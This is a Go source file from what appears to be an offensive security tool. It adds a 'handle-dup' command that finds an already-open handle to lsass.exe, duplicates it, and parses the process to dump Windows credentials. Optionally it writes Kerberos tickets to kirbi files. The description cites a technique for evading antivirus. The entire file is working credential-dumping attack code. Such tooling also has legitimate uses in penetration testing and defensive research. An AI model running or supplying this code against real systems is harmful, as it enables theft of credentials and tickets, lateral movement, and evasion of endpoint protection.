package lsass

import (
	"fmt"

	"github.com/spf13/cobra"

	"github.com/vincd/savoir/modules/sekurlsa"
	"github.com/vincd/savoir/modules/windows"
	"github.com/vincd/savoir/modules/windows/process"
)

func init() {
	var isJson bool
	var dumpKerberosTicket bool

	var handledupCmd = &cobra.Command{
		Use:   "handle-dup",
		Short: "Duplicate opened handle to lsass to parse it",
		Long:  `With DEBUG privilege, search for an opened handle on lsass.exe, duplicate it then dump lsass. Idea from (@skelsec)[https://skelsec.medium.com/duping-av-with-handles-537ef985eb03].`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			handles, err := windows.FindProcessHandles("lsass.exe")
			if err != nil {
				return err
			}

			for _, handle := range handles {
				p, err := process.NewProcessReaderWithHandle("lsass.exe", 0, handle)
				if err != nil {
					fmt.Printf("Cannot create new reader: %s\n", err)
					continue
				}
				defer p.Close()

				l, err := sekurlsa.NewLsaSrv(p)
				if err != nil {
					fmt.Printf("Cannot parse lsass: %s\n", err)
					continue
				}

				si := systemInfo{
					MajorVersion:          p.MajorVersion,
					MinorVersion:          p.MinorVersion,
					BuildNumber:           uint32(p.BuildNumber()),
					ProcessorArchitecture: p.ProcessorArchitecture().String(),
				}

				return PrintLsassDump(si, l, isJson, dumpKerberosTicket)
			}

			return fmt.Errorf("Cannot find an handle to parse lsass.")
		},
	}

	handledupCmd.Flags().BoolVarP(&isJson, "json", "j", false, "Print output as a JSON object")
	handledupCmd.Flags().BoolVarP(&dumpKerberosTicket, "dump-tickets", "d", false, "Dump Kerberos Tickets to kirbi files")

	Command.AddCommand(handledupCmd)
}
